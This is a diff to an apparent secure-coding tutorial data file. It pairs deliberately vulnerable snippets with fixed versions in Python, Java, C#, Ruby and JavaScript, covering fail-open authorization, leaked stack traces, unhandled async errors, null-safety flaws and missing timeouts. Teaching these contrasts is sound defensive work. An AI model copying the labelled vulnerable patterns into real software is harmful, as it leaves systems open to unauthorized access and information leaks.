-        && e.records > 1000),
-    severity: 'HIGH',
-    action: 'notifyDLP'
-  }
-];
-
-// Real-time event processor
-function processEvent(event) {
-  securityLog(event);
-  recentEvents.push(event);
-
-  for (const rule of alertRules) {
-    if (rule.condition(recentEvents)) {
-      triggerAlert({
-        rule: rule.name,
-        severity: rule.severity,
-        event,
-        action: rule.action
-      });
+# Average time to detect a breach: 204 days (IBM 2023)
+# Logs without alerting are forensic evidence at best
+# — too late to prevent the damage.`,
+        secureCode: `# Ruby — Secure: Automated alert rules with escalation
+class SecurityMonitor
+  ALERT_RULES = [
+    {
+      name: "Brute Force Detection",
+      condition: ->(events) {
+        events.count { |e|
+          e[:event] == "LOGIN_FAILURE" &&
+          e[:timestamp] > 5.minutes.ago
+        } >= 5
+      },
+      severity: "HIGH",
+      action: :lock_account
+    },
+    {
+      name: "Privilege Escalation",
+      condition: ->(events) {
+        events.any? { |e|
+          e[:event] == "PERMISSION_CHANGE" &&
+          e[:new_role] == "admin"
+        }
+      },
+      severity: "CRITICAL",
+      action: :notify_soc
+    },
+    {
+      name: "Mass Data Export",
+      condition: ->(events) {
+        events.any? { |e|
+          e[:event] == "DATA_EXPORT" && e[:records] > 1000
+        }
+      },
+      severity: "HIGH",
+      action: :notify_dlp
     }
-  }
-}
+  ]
 
-// Alerts sent via: PagerDuty, Slack, email, SMS
-// Response time target: < 15 minutes for CRITICAL`,
+  def process_event(event)
+    SecurityLog.create!(event)
+
+    ALERT_RULES.each do |rule|
+      if rule[:condition].call(recent_events)
+        trigger_alert(
+          rule: rule[:name],
+          severity: rule[:severity],
+          event: event,
+          action: rule[:action]
+        )
+      end
+    end
+  end
+end
+
+# Alerts sent via: PagerDuty, Slack, email, SMS
+# Response time target: < 15 minutes for CRITICAL`,
       },
       {
         title: "Client-Side Only Logging",
-        vulnerableCode: `// Vulnerable: Security events logged only in the browser
+        vulnerableCode: `// JavaScript — Vulnerable: Events logged only in browser
 function onLoginFailure(username) {
   // Only logs to browser console
   console.warn('Login failed for:', username);
@@ -2772,10 +3136,9 @@ function onSuspiciousActivity(details) {
 // 4. Cannot correlate events across users/sessions
 // 5. Cannot trigger automated responses
 // 6. Useless for forensics after an incident`,
-        secureCode: `// Secure: Client-side events forwarded to server
+        secureCode: `// JavaScript — Secure: Client events forwarded to server
 const SecurityTelemetry = {
   queue: [],
-  flushInterval: 5000,
 
   track(event) {
     this.queue.push({
@@ -2805,7 +3168,7 @@ const SecurityTelemetry = {
         await fetch('/api/security-events', {
           method: 'POST',
           body: payload,
-          keepalive: true
+          keepalive: true  // Survives page navigation
         });
       }
     } catch {
@@ -2815,9 +3178,10 @@ const SecurityTelemetry = {
   }
 };
 
-// Auto-flush periodically
+// Auto-flush every 5 seconds
 setInterval(() => SecurityTelemetry.flush(), 5000);
-// Flush on page unload
+
+// Flush on page unload (most reliable method)
 window.addEventListener('visibilitychange', () => {
   if (document.visibilityState === 'hidden') {
     SecurityTelemetry.flush();
@@ -2851,130 +3215,142 @@ window.addEventListener('visibilitychange', () => {
     examples: [
       {
         title: '"Fail Open" Authorization',
-        vulnerableCode: `// Vulnerable: "Fail Open" — errors grant access
-async function checkAuthorization(userId, resource) {
-  try {
-    const response = await fetch(
-      '/api/auth?user=' + userId + '&resource=' + resource
-    );
-    const data = await response.json();
-    return data.authorized;
-  } catch (error) {
-    // Service is down or network error
-    console.log('Auth service unavailable, allowing access');
-    return true; // ← FAIL OPEN: grants access on error!
-  }
-}
+        vulnerableCode: `# Python — Vulnerable: "Fail Open" — errors grant access
+import requests
 
-// Also vulnerable: Leaking stack traces
-app.get('/api/data', (req, res) => {
-  try {
-    const data = processRequest(req);
-    res.json(data);
-  } catch (error) {
-    res.status(500).json({
-      error: error.message,
-      stack: error.stack,  // ← Exposes file paths, versions
-      query: req.query     // ← Echoes back user input
-    });
-  }
-});`,
-        secureCode: `// Secure: "Fail Closed" — errors deny access
-async function checkAuthorization(userId, resource) {
-  try {
-    const response = await fetch(
-      '/api/auth?user=' + userId + '&resource=' + resource
-    );
-    if (!response.ok) {
-      throw new Error('Auth service returned ' + response.status);
+def check_authorization(user_id, resource):
+    try:
+        response = requests.get(
+            f"http://auth-service/check"
+            f"?user={user_id}&resource={resource}",
+            timeout=5
+        )
+        data = response.json()
+        return data.get("authorized", False)
+
+    except Exception as e:
+        # Service is down or network error
+        print(f"Auth service unavailable: {e}")
+        return True  # ← FAIL OPEN: grants access on error!
+
+# When the auth service is down or slow:
+# - ALL users get access to ALL resources
+# - An attacker can intentionally overload the auth service
+#   (DDoS) and then access everything
+# - Network glitches = temporary security bypass
+
+# This is one of the most common and dangerous patterns
+# in security-critical code.`,
+        secureCode: `# Python — Secure: "Fail Closed" — errors deny access
+import requests
+import logging
+
+security_logger = logging.getLogger('security')
+
+def check_authorization(user_id, resource):
+    try:
+        response = requests.get(
+            f"http://auth-service/check"
+            f"?user={user_id}&resource={resource}",
+            timeout=5
+        )
+
+        if response.status_code != 200:
+            raise ValueError(
+                f"Auth service returned {response.status_code}"
+            )
+
+        data = response.json()
+        return data.get("authorized") is True  # Strict boolean check
+
+    except Exception as e:
+        security_logger.error(
+            "AUTH_ERROR",
+            extra={
+                "user_id": user_id,
+                "resource": resource,
+                "error": str(e),
+                "severity": "HIGH"
+            }
+        )
+        return False  # ← FAIL CLOSED: deny by default
+
+# When the auth service is down:
+# - All access is denied (safe default)
+# - Error is logged with full context
+# - Security team is alerted
+# - Users see "Service temporarily unavailable"`,
+      },
+      {
+        title: "Exposed Stack Traces in Production",
+        vulnerableCode: `// Java Spring Boot — Vulnerable: Full stack trace to client
+@ControllerAdvice
+public class GlobalExceptionHandler {
+
+    @ExceptionHandler(Exception.class)
+    public ResponseEntity<?> handleAll(Exception ex) {
+        return ResponseEntity.status(500).body(Map.of(
+            "message", ex.getMessage(),
+            // Full stack trace exposed:
+            "stackTrace", Arrays.stream(ex.getStackTrace())
+                .map(StackTraceElement::toString)
+                .collect(Collectors.toList()),
+            // "com.myapp.db.UserRepository.findById(UserRepository.java:42)"
+            // "org.postgresql.core.v3.QueryExecutorImpl.execute(...)"
+
+            // Reveals:
+            // - Package structure: com.myapp.db
+            // - Database type: PostgreSQL
+            // - File paths and line numbers
+            // - Framework versions
+            "cause", ex.getCause() != null ? ex.getCause().getMessage() : null
+        ));
     }
-    const data = await response.json();
-    return data.authorized === true; // Strict boolean check
-  } catch (error) {
-    securityLogger.log({
-      event: 'AUTH_ERROR', severity: 'HIGH',
-      userId, resource, error: error.message
-    });
-    return false; // ← Deny by default
-  }
-}
+}`,
+        secureCode: `// Java Spring Boot — Secure: Generic errors with internal logging
+@ControllerAdvice
+public class GlobalExceptionHandler {
 
-// Safe error responses
-app.get('/api/data', (req, res) => {
-  try {
-    const data = processRequest(req);
-    res.json(data);
-  } catch (error) {
-    const errorId = crypto.randomUUID();
-    internalLogger.error({ errorId, error });
-    res.status(500).json({
-      error: 'An unexpected error occurred.',
-      referenceId: errorId
-    });
-  }
-});`,
+    private static final Logger log =
+        LoggerFactory.getLogger(GlobalExceptionHandler.class);
+
+    private static final Map<String, String> ERROR_MESSAGES = Map.of(
+        "VALIDATION", "The provided data is invalid.",
+        "NOT_FOUND", "The requested resource was not found.",
+        "UNAUTHORIZED", "Authentication required.",
+        "FORBIDDEN", "You do not have permission.",
+        "DEFAULT", "An unexpected error occurred."
+    );
+
+    @ExceptionHandler(Exception.class)
+    public ResponseEntity<?> handleAll(
+            Exception ex, HttpServletRequest request) {
+        String errorId = UUID.randomUUID().toString();
+
+        // Full details logged internally
+        log.error("Unhandled exception. errorId={}, path={}, user={}",
+            errorId, request.getRequestURI(),
+            SecurityContextHolder.getContext()
+                .getAuthentication().getName(),
+            ex  // Stack trace goes to server logs only
+        );
+
+        // Generic message to client
+        String category = categorizeException(ex);
+        return ResponseEntity.status(
+            ex instanceof AppException
+                ? ((AppException) ex).getStatusCode() : 500
+        ).body(Map.of(
+            "error", ERROR_MESSAGES.getOrDefault(category, ERROR_MESSAGES.get("DEFAULT")),
+            "referenceId", errorId
+            // No stack trace, no SQL, no internal paths
+        ));
+    }
+}`,
       },
       {
-        title: "Exposed Stack Traces",
-        vulnerableCode: `// Vulnerable: Full error details sent to the client
-app.use((err, req, res, next) => {
-  res.status(500).json({
-    message: err.message,
-    // Full stack trace exposed:
-    stack: err.stack,
-    // "Error: ECONNREFUSED 10.0.1.5:5432
-    //    at TCPConnectWrap (/app/node_modules/pg/...)
-    //    at Object.<anonymous> (/app/src/db/pool.js:23:8)"
-
-    // Reveals:
-    // - Database IP address: 10.0.1.5
-    // - Database port: 5432 (PostgreSQL)
-    // - File paths: /app/src/db/pool.js
-    // - Library versions from node_modules paths
-    // - Internal service architecture
-
-    // Often combined with req context:
-    sql: err.sql,      // Leaked SQL query
-    params: err.params // Leaked query parameters
-  });
-});`,
-        secureCode: `// Secure: User-friendly error with internal-only logging
-const ERROR_MESSAGES = {
-  VALIDATION: 'The provided data is invalid.',
-  NOT_FOUND: 'The requested resource was not found.',
-  UNAUTHORIZED: 'Authentication required.',
-  FORBIDDEN: 'You do not have permission.',
-  RATE_LIMITED: 'Too many requests. Please wait.',
-  DEFAULT: 'An unexpected error occurred.'
-};
-
-app.use((err, req, res, next) => {
-  const errorId = crypto.randomUUID();
-
-  // Full details logged internally
-  logger.error({
-    errorId,
-    message: err.message,
-    stack: err.stack,
-    url: req.originalUrl,
-    method: req.method,
-    userId: req.user?.id
-  });
-
-  // Generic message to client
-  const statusCode = err.statusCode || 500;
-  const category = err.category || 'DEFAULT';
-
-  res.status(statusCode).json({
-    error: ERROR_MESSAGES[category] || ERROR_MESSAGES.DEFAULT,
-    referenceId: errorId
-    // No stack, no SQL, no internal paths, no params
-  });
-});`,
-      },
-      {
-        title: "Unhandled Promise Rejections",
-        vulnerableCode: `// Vulnerable: Unhandled promise rejections crash the app
+        title: "Unhandled Promise Rejections / Async Errors",
+        vulnerableCode: `// Node.js — Vulnerable: Unhandled async errors
 async function processOrder(orderId) {
   const order = await db.orders.findById(orderId);
   const payment = await chargeCard(order.total);
@@ -2996,7 +3372,7 @@ app.post('/api/orders/:id/process', async (req, res) => {
 // UnhandledPromiseRejectionWarning → process exits
 // All in-flight requests are dropped
 // Users see ERR_CONNECTION_REFUSED`,
-        secureCode: `// Secure: Proper async error handling + compensating actions
+        secureCode: `// Node.js — Secure: Proper async error handling + rollback
 async function processOrder(orderId) {
   const order = await db.orders.findById(orderId);
   let paymentId = null;
@@ -3020,7 +3396,8 @@ async function processOrder(orderId) {
     if (paymentId) {
       await refundPayment(paymentId).catch(refundErr => {
         logger.critical({
-          event: 'REFUND_FAILED', orderId, paymentId,
+          event: 'REFUND_FAILED',
+          orderId, paymentId,
           error: refundErr.message
         });
         // Alert for manual intervention
@@ -3041,165 +3418,172 @@ app.post('/api/orders/:id/process', async (req, res) => {
     await processOrder(req.params.id);
     res.json({ status: 'completed' });
   } catch (error) {
-    res.status(500).json({ error: 'Order processing failed' });
+    res.status(500).json({
+      error: 'Order processing failed',
+      referenceId: crypto.randomUUID()
+    });
   }
 });
 
-// Global safety net
+// Global safety net (last resort)
 process.on('unhandledRejection', (reason) => {
   logger.critical({ event: 'UNHANDLED_REJECTION', reason });
   // Graceful shutdown instead of hard crash
 });`,
       },
       {
-        title: "Type Coercion Errors in Validation",
-        vulnerableCode: `// Vulnerable: JavaScript type coercion bypasses checks
-function isAdmin(user) {
-  // Loose equality (==) allows type coercion
-  if (user.role == true) {
-    return true;  // Intended: only role === 'admin'
-  }
-  return false;
+        title: "Type Coercion / Null Safety Errors",
+        vulnerableCode: `// C# — Vulnerable: Null reference and type errors
+public class DiscountService
+{
+    public decimal ApplyDiscount(string code, object amount)
+    {
+        // No null check — NullReferenceException if code is null
+        if (code.ToUpper() == "VIP")
+        {
+            // No type validation on amount
+            var discount = (decimal)amount;  // InvalidCastException
+            return discount * 0.8m;
+        }
+        return (decimal)amount;
+    }
+
+    public bool IsAdmin(User user)
+    {
+        // If user.Role is null, this throws NullReferenceException
+        // Crashing the request instead of denying access
+        return user.Role.ToLower() == "admin";
+    }
+
+    public string GetUserEmail(int userId)
+    {
+        var user = db.Users.Find(userId);
+        // If user is null, NullReferenceException!
+        return user.Email;
+        // Unhandled exception → 500 with stack trace
+    }
 }
 
-// user.role = 1 → 1 == true → TRUE (bypasses check!)
-// user.role = "1" → "1" == true → TRUE
+// Each unhandled exception potentially:
+// 1. Crashes the request handler
+// 2. Exposes stack trace to the client
+// 3. Leaves the system in an inconsistent state`,
+        secureCode: `// C# — Secure: Null safety + explicit type validation
+public class DiscountService
+{
+    public Result<decimal> ApplyDiscount(string? code, object? amount)
+    {
+        // Explicit null and type checks
+        if (string.IsNullOrWhiteSpace(code))
+            return Result<decimal>.Fail("Discount code is required");
 
-function validateDiscount(code, amount) {
-  // No type checking on amount
-  if (amount > 0 && amount < 100) {
-    applyDiscount(amount);
-  }
+        if (amount is not decimal validAmount)
+            return Result<decimal>.Fail("Amount must be a decimal");
+
+        if (validAmount <= 0 || validAmount > 10000)
+            return Result<decimal>.Fail("Amount out of valid range");
+
+        if (code.Equals("VIP", StringComparison.OrdinalIgnoreCase))
+            return Result<decimal>.Ok(validAmount * 0.8m);
+
+        return Result<decimal>.Ok(validAmount);
+    }
+
+    public bool IsAdmin(User? user)
+    {
+        // Null-safe: returns false (fail closed) if anything is null
+        return string.Equals(
+            user?.Role, "admin",
+            StringComparison.OrdinalIgnoreCase
+        );
+    }
+
+    public Result<string> GetUserEmail(int userId)
+    {
+        var user = db.Users.Find(userId);
+        if (user is null)
+            return Result<string>.Fail("User not found");
+
+        return Result<string>.Ok(user.Email ?? "");
+    }
 }
 
-// amount = "99.99" → "99.99" > 0 → true (string comparison)
-// amount = "999" → "999" < 100 → true (lexicographic!)
-// Because "999" < "100" is false, but "999" < 100 is...
-// Actually "999" > 0 is true, "999" < 100 is false.
-// But: amount = [] → [] > 0 → false, safe by accident
-// amount = [50] → [50] > 0 → true, [50] < 100 → true!`,
-        secureCode: `// Secure: Strict type checking and validation
-function isAdmin(user) {
-  // Strict equality — no type coercion
-  if (typeof user.role !== 'string') {
-    return false;
-  }
-  return user.role === 'admin';
-}
-
-function validateDiscount(code, amount) {
-  // Explicit type validation
-  if (typeof amount !== 'number' || !Number.isFinite(amount)) {
-    throw new TypeError('amount must be a finite number');
-  }
-
-  if (amount <= 0 || amount >= 100) {
-    throw new RangeError('amount must be between 0 and 100');
-  }
-
-  applyDiscount(amount);
-}
-
-// Even better: use a validation library
-const { z } = require('zod');
-
-const DiscountSchema = z.object({
-  code: z.string().min(1).max(50),
-  amount: z.number().positive().max(99.99)
-});
-
-function validateDiscountZod(input) {
-  const result = DiscountSchema.safeParse(input);
-  if (!result.success) {
-    throw new Error('Validation failed: '
-      + result.error.issues.map(i => i.message).join(', '));
-  }
-  return result.data; // Typed, validated, safe
-}`,
+// Every method returns a Result instead of throwing
+// No unhandled exceptions, no stack traces leaked
+// Null references are handled gracefully`,
       },
       {
         title: "No Timeout on External Calls",
-        vulnerableCode: `// Vulnerable: No timeout on external service calls
-async function getUserProfile(userId) {
-  // If the service hangs, this waits FOREVER
-  const response = await fetch(
-    'https://api.external.com/users/' + userId
-  );
-  return response.json();
-}
+        vulnerableCode: `# Python — Vulnerable: No timeout on external service calls
+import requests
 
-async function processPayment(order) {
-  // Payment API hangs → request hangs → thread blocked
-  const result = await fetch('https://payments.example.com/charge', {
-    method: 'POST',
-    body: JSON.stringify(order)
-  });
-  return result.json();
-}
+def get_user_profile(user_id):
+    # If the service hangs, this waits FOREVER
+    response = requests.get(
+        f"https://api.external.com/users/{user_id}"
+    )
+    return response.json()
 
-// Consequences of no timeouts:
-// 1. One slow service cascades to entire application
-// 2. Thread pool exhaustion — no new requests handled
-// 3. Memory grows as pending requests accumulate
-// 4. User sees infinite loading spinner
-// 5. Attackers can exploit: slow requests = easy DoS`,
-        secureCode: `// Secure: Timeouts + circuit breaker pattern
-async function getUserProfile(userId) {
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 5000);
+def process_payment(order):
+    # Payment API hangs → request hangs → thread blocked
+    result = requests.post(
+        "https://payments.example.com/charge",
+        json=order
+    )
+    return result.json()
 
-  try {
-    const response = await fetch(
-      'https://api.external.com/users/' + userId,
-      { signal: controller.signal }
-    );
+# Consequences of no timeouts:
+# 1. One slow service cascades to entire application
+# 2. Thread pool exhaustion — no new requests handled
+# 3. Memory grows as pending requests accumulate
+# 4. User sees infinite loading spinner
+# 5. Attackers can exploit: slow requests = easy DoS
+# 6. Gunicorn/uWSGI worker timeout kills the process`,
+        secureCode: `# Python — Secure: Timeouts + circuit breaker pattern
+import requests
+from circuitbreaker import circuit
 
-    if (!response.ok) {
-      throw new Error('Service returned ' + response.status);
-    }
+# Always set timeouts on ALL external calls
+def get_user_profile(user_id):
+    try:
+        response = requests.get(
+            f"https://api.external.com/users/{user_id}",
+            timeout=(3, 10)  # (connect_timeout, read_timeout)
+        )
+        response.raise_for_status()
+        return response.json()
 
-    return await response.json();
-  } catch (error) {
-    if (error.name === 'AbortError') {
-      logger.warn({ event: 'EXTERNAL_TIMEOUT', userId });
-      // Return cached/fallback data instead of failing
-      return getCachedProfile(userId) || { name: 'Unknown' };
-    }
-    throw error;
-  } finally {
-    clearTimeout(timeout);
-  }
-}
+    except requests.Timeout:
+        logger.warning("EXTERNAL_TIMEOUT", extra={
+            "service": "user-api",
+            "user_id": user_id
+        })
+        # Return cached/fallback data instead of failing
+        return get_cached_profile(user_id) or {"name": "Unknown"}
 
-// Circuit breaker: stop calling a failing service
-class CircuitBreaker {
-  constructor(fn, { threshold = 5, resetMs = 30000 } = {}) {
-    this.fn = fn;
-    this.failures = 0;
-    this.threshold = threshold;
-    this.resetMs = resetMs;
-    this.state = 'CLOSED'; // CLOSED → OPEN → HALF_OPEN
-  }
+    except requests.RequestException as e:
+        logger.error("EXTERNAL_ERROR", extra={
+            "service": "user-api",
+            "error": str(e)
+        })
+        raise ServiceUnavailableError("User service unavailable")
 
-  async call(...args) {
-    if (this.state === 'OPEN') {
-      throw new Error('Circuit breaker is OPEN');
-    }
-    try {
-      const result = await this.fn(...args);
-      this.failures = 0;
-      this.state = 'CLOSED';
-      return result;
-    } catch (error) {
-      this.failures++;
-      if (this.failures >= this.threshold) {
-        this.state = 'OPEN';
-        setTimeout(() => { this.state = 'HALF_OPEN'; }, this.resetMs);
-      }
-      throw error;
-    }
-  }
-}`,
+# Circuit breaker: stop calling a failing service
+@circuit(failure_threshold=5, recovery_timeout=30)
+def process_payment(order):
+    response = requests.post(
+        "https://payments.example.com/charge",
+        json=order,
+        timeout=(3, 15)
+    )
+    response.raise_for_status()
+    return response.json()
+
+# After 5 failures in a row:
+# - Circuit breaker OPENS — calls fail immediately
+# - No more requests sent to the failing service
+# - After 30 seconds, one test request is allowed
+# - If it succeeds, circuit CLOSES (normal operation)`,
       },
     ],
   },
